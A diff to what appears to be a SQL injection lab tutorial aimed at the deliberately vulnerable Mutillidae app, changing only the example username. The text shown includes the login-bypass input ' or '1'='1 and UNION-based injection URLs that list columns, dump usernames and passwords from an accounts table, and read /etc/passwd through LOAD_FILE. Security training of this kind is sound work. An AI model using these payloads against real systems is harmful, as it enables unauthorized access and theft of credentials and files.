@@ -50,7 +50,7 @@ Click on “Create Account” to display the following page:
 
 The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:
 
-($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;). For the username put “senthil” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.
+($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;). For the username put “vineesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.
 
 ![Screenshot 2024-05-10 180828](https://github.com/Vineesh-AI-DS/sqlinjection/assets/93427254/7515bd86-2118-4bbc-aa4e-d0ef67aab569)
 
@@ -154,7 +154,7 @@ Here we are trying to extract column names from the “accounts” table.
 
 The column names of the accounts is displayed below for the following url:
 
-http://192.168.1.7/mutillidae/index.php?page=user-info.php&username=senthil%27union%20select%201,colunm_name,null,null,5%20from%20information_schema.columns%20where%20table_name%20=%20%E2%80%98accounts%E2%80%99%23&password=sk710-info-php-submit-button=View+Account+Details
+http://192.168.1.7/mutillidae/index.php?page=user-info.php&username=vineesh%27union%20select%201,colunm_name,null,null,5%20from%20information_schema.columns%20where%20table_name%20=%20%E2%80%98accounts%E2%80%99%23&password=sk710-info-php-submit-button=View+Account+Details
 
 ![WhatsApp Image 2024-05-10 at 20 12 41_3ec9c423](https://github.com/Vineesh-AI-DS/sqlinjection/assets/93427254/b2e8f64e-75bd-44cb-9dee-a538cfcbb3ea)
 
@@ -162,7 +162,7 @@ Once we discovered all available column names, we can extract information from t
 
 Ex: (union select 1,username,password,is_admin,5 from accounts).
 
-http://192.168.1.7/mutillidae/index.php?page=user-info.php&username=senthil%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=sk710-info-php-submit-button=View+Account+Details
+http://192.168.1.7/mutillidae/index.php?page=user-info.php&username=vineesh%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=sk710-info-php-submit-button=View+Account+Details
 
 ![](o20.png)
 
@@ -171,7 +171,7 @@ We can use the “LOAD_FILE()” operator to peruse the contents of any file con
 
 Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).
 
-http://192.168.1.7/mutillidae/index.php?page=user-info.php&username=senthil%27union%20select%20null,load_file(%E2%80%98/etc/passwd%E2%80%99),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details
+http://192.168.1.7/mutillidae/index.php?page=user-info.php&username=vineesh%27union%20select%20null,load_file(%E2%80%98/etc/passwd%E2%80%99),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details
 
 
 ![WhatsApp Image 2024-05-10 at 20 15 32_78261b84](https://github.com/Vineesh-AI-DS/sqlinjection/assets/93427254/0ea2a3bf-039c-4f70-9dbf-bc63d73f2c68)
